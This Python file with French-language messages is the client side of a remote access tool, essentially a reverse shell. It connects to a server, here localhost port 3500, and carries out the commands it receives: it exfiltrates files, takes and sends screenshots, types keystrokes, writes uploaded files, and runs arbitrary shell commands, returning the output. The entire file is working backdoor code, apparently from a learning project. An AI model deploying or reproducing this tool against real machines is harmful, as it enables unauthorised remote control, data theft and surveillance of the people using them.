
import socket
import time
import subprocess
import os
import platform
import pyautogui
from PIL import ImageGrab

HOST_IP = "127.0.0.1"
HOST_PORT = 3500
MAX_DATA_SIZE = 1024
LISTE_COMMANDES = """
- dl (file-name)
- screenshot (file-name)

"""



print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("Erreur : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break
    

while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break

    
    commande = commande_data.decode()
    print("Commande : ", commande)
    
    commande_split = commande.split(" ")
    
    # ------------------------------------------------------------------------------
    if commande == "infos":
        reponse = platform.platform() + " " + os.getcwd()
        reponse = reponse.encode('ascii', errors='ignore')
    # ------------------------------------------------------------------------------
    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1].strip("'"))
            reponse = " "
        except FileNotFoundError:
            reponse = "ERREUR : ce répertoire n'existe pas"
        reponse = reponse.encode('ascii', errors='ignore')
    # ------------------------------------------------------------------------------
    elif len(commande_split) == 2 and commande_split[0] == "dl":
        try:
            f = open(commande_split[1], "rb")
        except FileNotFoundError:
            reponse = " ".encode('ascii', errors='ignore')
        else:
            reponse = f.read()
        f.close()
    # ------------------------------------------------------------------------------
    elif len(commande_split) == 2 and commande_split[0] == "screenshot":
        capture_ecran = ImageGrab.grab()
        capture_filename = commande_split[1] + ".png"
        capture_ecran.save(capture_filename, "PNG")
        try:
            f = open(capture_filename, "rb")
        except FileNotFoundError:
            reponse = " ".encode('ascii', errors='ignore')
        else:
            reponse = f.read()
            f.close() 
    # ------------------------------------------------------------------------------
    elif commande_split[0] == "commands":
        reponse = LISTE_COMMANDES.encode('ascii', errors='ignore')
    # ------------------------------------------------------------------------------
    elif len(commande_split) == 2 and commande_split[0] == "write":
        pyautogui.typewrite(commande[6:])
        reponse = "Message envoyé.".encode('ascii', errors='ignore')
    # ------------------------------------------------------------------------------
    # [commande, filename, data]
    elif len(commande_split) > 1 and commande_split[0] == "upload":
        up_filename = commande_split[1]
        f = open(commande_split[1], "wb")
        data_file = commande_split[2].encode()
        f.write(data_file)
        f.close()
        reponse = "Fichier uploadé.".encode('ascii', errors='ignore')
    # ------------------------------------------------------------------------------ 
    else:
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr
        
        if not reponse or len(reponse) == 0:
            reponse = " "  
        reponse = reponse.encode('ascii', errors='ignore')
    # ------------------------------------------------------------------------------
    
    data_len = len(reponse)
    header = str(data_len).zfill(13)
    s.sendall(header.encode('ascii', errors='ignore'))
    if data_len > 0:
        s.sendall(reponse)
    
s.close()

         
         